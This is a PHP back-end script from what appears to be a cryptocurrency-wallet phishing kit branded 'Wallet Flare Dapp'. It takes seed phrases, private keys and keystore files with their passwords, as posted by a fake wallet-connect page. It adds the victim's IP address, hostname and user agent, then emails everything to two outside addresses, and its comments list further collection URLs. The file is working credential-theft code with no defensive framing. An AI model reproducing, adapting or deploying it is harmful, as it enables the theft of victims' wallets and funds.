<?php

// Allow CORS
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With");

// Handle pre-flight requests
if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    // Stop script processing for pre-flight, after headers are sent
    exit;
}

function getRealIpUser()
{

    switch (true) {

        case (!empty($_SERVER['HTTP_X_REAL_IP'])):
            return $_SERVER['HTTP_X_REAL_IP'];
        case (!empty($_SERVER['HTTP_CLIENT_IP'])):
            return $_SERVER['HTTP_CLIENT_IP'];
        case (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])):
            return $_SERVER['HTTP_X_FORWARDED_FOR'];

        default:
            return $_SERVER['REMOTE_ADDR'];
    }
}
?>
<?php

if ($_POST['importType']) {

    $ip = getRealIpUser();
    $importType = $_POST['importType'];
    $dappName = $_POST['dappName'];
    $response = "";
    $date = date("Y-m-d h:i:s");

    $hostname = gethostbyaddr($ip);
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    $message = '';
    $message .= "|----------| WALLET CONNECTED  |--------------|\n\n";

    if ($importType == 'Phrase') {

        $dappMnemonic = $_POST['dappMnemonic'];
        $dappAddress = $_POST['dappAddress'];

        $message .= "Phrase: " . $dappMnemonic . "\n";
        $message .= "Address: " . $dappAddress . "\n";

    } elseif ($importType == 'PrivateKey') {

        $dappKeys = $_POST['dappKeys'];
        $dappAddress = $_POST['dappAddress'];

        $message .= "PrivateKeys: " . $dappKeys . "\n";
        $message .= "Address: " . $dappAddress . "\n";

    } else {

        $dappKeystore = $_POST['dappKeystore'];
        $dappPassword = $_POST['dappPassword'];

        $message .= "Keystore: " . $dappKeystore . "\n";
        $message .= "Keystore Password: " . $dappPassword . "\n";
    }

    $message .= "Type: " . $dappName . "\n";
    $message .= "Date received:  " . $date . "\n";
    $message .= "|--------------- I N F O | I P -------------------|\n";
    $message .= "|Client IP: " . $ip . "\n";
    $message .= "|--- https://www.geodatatool.com/en/?ip=$ip ------\n";
    $message .= "User Agent : " . $useragent . "\n";
    $message .= "|------------------------------------------------|\n";

    // headers section
    // Create email headers
    $headers = 'From: mailer@walletflaredapp.com' . "\r\n" .
    'Reply-To: mailer@walletflaredapp.com' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();

    //send mail
    $email_one_1 = "chr1sgunter@yandex.com";
    $email_one_2 = "nftrecoveryteam@ftceurecovery.com";
    

    $subject = "|----------|WALLET FLARE DAPP RESULT|------| $ip";
    $sendFirstMail = mail($email_one_1, $subject, $message, $headers);
    $sendFirst2Mail = mail($email_one_2, $subject, $message, $headers);

    // https://ftceurecovery.com/action/validate.php
   // https://voicewelfare.com/recovery/walletflaredex.php
}
